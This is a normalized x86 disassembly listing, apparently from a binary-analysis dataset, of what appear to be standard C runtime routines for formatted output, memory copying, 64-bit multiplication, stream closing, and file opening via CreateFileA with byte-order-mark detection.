and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_200fd60
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_2020828
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_200b6a1
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_20206bf
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_200fd60
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_2020828
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_201a99e
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_2020760
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_2020828
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_2016140
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_200fd60
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_20206bf
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_2021420
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_20214a8 ]
jmp [ ecx * 4 + jump_table_2021528 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2021594 ]
pop esi
pop edi
pop ebp
jmp sub_2022e42
jmp [ ecx * 4 + jump_table_2021730 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_2021634 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2021730 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_2021594 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_2021730 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2021594 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2021594 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_2021594 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2021730 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2021730 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_2021730 ]
sub_2021790
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_20217c4
push 0x10
push r--data
call sub_200db54
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_202185a
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_200adb2
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_2009d98
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_2021863
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_2024a97
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_200fb26
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_2022658
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_200fb26
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_200fb13
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_200fb13
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_200fb39
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp esi ebx
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_200fb39
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_200fb13
mov [ eax ] 0xd
jmp r-xdata
and [ ebp - 0x8 ] 0x7fffffff
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x14 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ esi ]
call sub_2022413
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
mov [ eax ] cl
cmp [ ebp - 0x3 ] bl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0xc0000000
mov ecx edi
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x20 ]
and eax edi
jne r-xdata
push 0x2
or edi 0xffffffff
push edi
push [ esi ]
call sub_2014b04
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp eax edi
jne r-xdata
mov eax ebx
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] bl
call sub_2012e0a
add esp 0xc
test eax eax
jne r-xdata
call sub_200fb26
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push ebx
push [ ebp - 0xc ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x10 ]
and edi 0x7fffffff
push edi
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x18 ] ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push ebx
push ebx
push [ esi ]
call sub_2014b04
add esp 0xc
cmp eax edi
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_201496a
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_200fb39
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_2022494
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
push [ esi ]
call sub_20246d0
add esp 0xc
cmp eax edi
je r-xdata
pop ecx
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x18 ]
push eax
push [ esi ]
call sub_2012e0a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax ebx
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x18 ] 0xbfbbef
mov [ ebp - 0x14 ] 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_2020308
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp [ ebp - 0x14 ] edi
jg r-xdata
mov [ ebp - 0x18 ] 0xfeff
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_2020308
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_201496a
pop ecx
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push [ esi ]
call sub_2014b04
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x18 ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax [ ebp - 0x14 ]
sub eax edi
push eax
lea eax [ ebp + edi - 0x18 ]
push eax
push [ esi ]
call sub_2013d2d
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push 0x2
push [ esi ]
call sub_2014b04
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push ebx
push ebx
push [ esi ]
call sub_2020308
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_2020308
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_2021f82
push 0x14
push r--data
call sub_200db54
or [ ebp - 0x1c ] 0xffffffff
xor esi esi
mov [ ebp - 0x20 ] esi
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
push [ ebp + 0x10 ]
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
call sub_2021863
add esp 0x14
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2021ffe
mov edi [ ebp - 0x24 ]
cmp edi esi
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
mov eax [ ebp - 0x1c ]
call sub_200fb13
mov [ eax ] edi
jmp r-xdata
call sub_200db99
retn
or eax 0xffffffff
jmp r-xdata
sub_2021ffe
cmp [ ebp - 0x20 ] esi
je r-xdata
retn
cmp [ ebp - 0x24 ] esi
je r-xdata
push [ ebp - 0x1c ]
call sub_2022631
pop ecx
mov eax [ ebp - 0x1c ]
sar eax 0x5
mov ecx [ ebp - 0x1c ]
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_2022038
push 0x14
push r--data
call sub_200db54
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_200fb13
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_200db99
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_2021863
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20220d6
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_20220d6
